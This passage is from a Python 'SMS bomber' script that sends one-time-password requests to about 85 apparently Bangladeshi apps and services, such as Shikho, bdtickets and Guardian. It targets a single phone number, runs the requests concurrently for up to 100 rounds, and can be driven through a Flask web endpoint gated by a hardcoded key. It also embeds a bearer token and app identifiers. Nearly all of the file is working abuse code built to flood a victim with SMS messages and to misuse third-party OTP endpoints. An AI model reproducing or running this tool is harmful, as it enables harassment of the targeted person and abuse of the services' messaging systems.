            h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': 'application/json', 'User-Agent': 'dart/3.5 (dart:io)'}
        elif api == 'smartsohay':
            url = 'https://yunpodyw5-api.smartsohay.com/api/send-otp/'; body = json.dumps({"phone_number": pr})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Dart/3.5 (dart:io)'}
        elif api == 'shikhosms':
            url = 'https://api.shikho.com/auth/v2/send/sms'
            body = json.dumps({"phone": p8, "type": "student", "auth_type": "login", "vendor": "shikho", "google_ads_id": "a9b2dfa9-6a62-4d27-b37b-216ca4dc2bf5"})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': 'Dart/3.5 (dart:io)'}
        elif api == 'udvash':
            url = 'https://umsdmpreact-2.udvash-unmesh.com/webapi/Account/Registration/InitializeOtp'
            body = json.dumps({"nickName": fN, "mobileNumber": p8, "returnUrl": "https://umsdmpreact-2.udvash-unmesh.com", "isResendOtp": False})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://umsdmpreact-2.udvash-unmesh.com'}
        elif api == 'bdtickets':
            url = 'https://apiv1.bdtickets.com/api/v1/auth/otp/send'
            body = json.dumps({"phone": pp, "smsHashCode": "LyVdeOZ2kOE"})
            h.update({'x-channel': 'direct', 'x-platform': 'android', 'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uX2lkIjoiZmE5NTgxYzQtZjcwOS00YzA2LWJlMzktM2Q4MWQzYmVkYmI1IiwiaXNfYW5vbnltb3VzIjp0cnVlLCJ0b2tlbl92ZXJzaW9uIjoxLCJyb2xlcyI6W10sInBlcm1pc3Npb25zIjpbXSwianRpIjoiM2YzNGQ2ZDAtYzNkMS00MDIyLTlmZmQtZjFjYjdiNGQ5YzJiIiwiaWF0IjoxNzg1OTk4MzMwLCJleHAiOjE3ODY2MDMxMzB9.riYHYuJa2AnrVPiU1oULih2YRtdTTN6hPE-i9LsJlZg'})
        elif api == 'guardian':
            url = 'https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp'
            body = json.dumps({"mobileNumber": pr, "type": None}); h.update({'clientid': 'RP1A.200720.011'})
        elif api == 'goldkinen':
            url = 'https://app-neo.goldkinen.com/api/v2/auth/request-otp/'
            body = json.dumps({"phone": pr, "scope": "REGISTRATION", "is_resend": False})
            h.update({'authorization': 'Bearer', 'version-code': '4.2.9', 'User-Agent': 'gk-app'})
    except Exception:
        return None
    return {'url': url, 'body': body, 'headers': h, 'method': method}

# ============ API List ============
APIS = [
    'binge','admissiontaker','medico','chardike','apex4u','ghoori','mygp','shikho','redx',
    'fteducation','banglalink','robi','bohubrihi','sheba','trucklagbe','osudpotro',
    'banglamed','cookups','arogga','chaldal','shohoz','bengalmeat','unimart',
    'cholpori','deeptoplay','paperfly','aarong','esquire','htmind','kireibd','kabbik',
    'cinespot','edutubebd','propertywala','bengalmeat_otp','perfumeshop','bookhouse',
    'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
    'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao',
    'garibook','shadhin','khaasfood','suzuki','biddabari','karobar','packly',
    'carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho',
    'udvash','amarbay','rhombus','toffee','apcom','ieducation','brritto','edgecourse',
    'shopbase','jamakapor','quizbd','shukhee','smartsohay','shikhosms','walifier',
    'bdtickets','guardian','goldkinen'
]

async def call_api(session, api, phone):
    req = build_request(api, phone)
    if not req: return {'api': api, 'status': 0, 'time_ms': 0}
    t0 = time.time()
    try:
        if req['method'] == 'GET':
            async with session.get(req['url'], headers=req['headers'], timeout=aiohttp.ClientTimeout(total=3), ssl=SSL_CTX) as r:
                status = r.status
        else:
            async with session.post(req['url'], data=req['body'], headers=req['headers'], timeout=aiohttp.ClientTimeout(total=3), ssl=SSL_CTX) as r:
                status = r.status
    except Exception:
        status = 0
    elapsed = round((time.time() - t0) * 1000)
    return {'api': api, 'status': status, 'time_ms': elapsed}

async def fire_round(phone):
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ttl_dns_cache=300, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [call_api(session, api, phone) for api in APIS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, dict)]

def fire_round_sync(phone):
    return asyncio.run(fire_round(phone))

async def run_async(phone_str, rounds):
    phone = fmt_phone(phone_str)
    t0 = time.time()
    all_results = {}
    for rnd in range(1, rounds + 1):
        results = await fire_round(phone)
        all_results[f"round_{rnd}"] = {r['api']: {'status': r['status'], 'time_ms': r['time_ms']} for r in sorted(results, key=lambda x: x['api'])}
    total_time = round((time.time() - t0) * 1000)
    total = sum(len(v) for v in all_results.values())
    ok_count = sum(1 for v in all_results.values() for r in v.values() if 200 <= r['status'] < 300)
    return {'phone': phone_str, 'rounds': rounds, 'total_hits': total, 'ok': ok_count, 'fail': total - ok_count, 'total_time_ms': total_time, 'results': all_results}

def run(phone_str, rounds):
    return asyncio.run(run_async(phone_str, rounds))

# ============ Flask Server ============
def start_flask(port=8080):
    from flask import Flask, request, jsonify
    SECRET = os.environ.get('API_SECRET', 'SuSHiLx2024SMS')
    app = Flask(__name__)

    @app.route('/')
    def fire():
        phone = request.args.get('phone', '')
        rounds = min(max(int(request.args.get('rounds', 1)), 1), 100)
        key = request.args.get('key', '')
        if key != SECRET: return jsonify({'error': 'Wrong key'}), 403
        if not phone or len(phone) < 11: return jsonify({'error': 'Invalid phone'}), 400
        def fire_bg(): run(phone, rounds)
        threading.Thread(target=fire_bg, daemon=True).start()
        return jsonify({'status': 'started', 'phone': phone, 'rounds': rounds, 'total_apis': len(APIS), 'total_hits': len(APIS) * rounds, 'msg': f'Started! {len(APIS) * rounds} SMS'})

    @app.route('/check', methods=['POST'])
    def check_apis():
        phone_str = request.json.get('phone', '') if request.is_json else ''
        key = request.args.get('key', '') or (request.json.get('key', '') if request.is_json else '')
        if key != SECRET: return jsonify({'error': 'Wrong key'}), 403
        if not phone_str or len(phone_str) < 11: return jsonify({'error': 'Invalid phone'}), 400
        phone = fmt_phone(phone_str)
        results = fire_round_sync(phone)
        results.sort(key=lambda x: x['api'])
        return jsonify({'phone': phone_str, 'total': len(results), 'ok': sum(1 for r in results if 200 <= r['status'] < 300), 'fail': sum(1 for r in results if r['status'] == 0 or r['status'] < 200 or r['status'] >= 300), 'results': results})

    @app.after_request
    def add_cors(r):
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        r.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
        return r

    print(f"\n  Flask Server: http://0.0.0.0:{port}  |  {len(APIS)} APIs  |  aiohttp async\n")
    app.run(host='0.0.0.0', port=port, threaded=True)

# ============ CLI ============
if __name__ == '__main__':
    if '--flask' in sys.argv:
        p = int(os.environ.get('PORT', 8080))
        for i, a in enumerate(sys.argv):
            if a == '--port' and i + 1 < len(sys.argv): p = int(sys.argv[i + 1])
        start_flask(p)
    elif len(sys.argv) >= 2 and any(c.isdigit() for c in sys.argv[1]):
        phone = sys.argv[1]; rounds = int(sys.argv[2]) if len(sys.argv) >= 3 else 1
        print(f"Fire: {phone} x {rounds} rounds ({len(APIS) * rounds} hits)")
        result = run(phone, rounds)
        print(json.dumps(result, indent=2))
    else:
        print(f"\nRunner v4 — aiohttp async | {len(APIS)} APIs | ~2s/round\nUsage:\n  python runner.py 017XXXXXXXX 5\n  python runner.py --flask [--port 8080]\n")
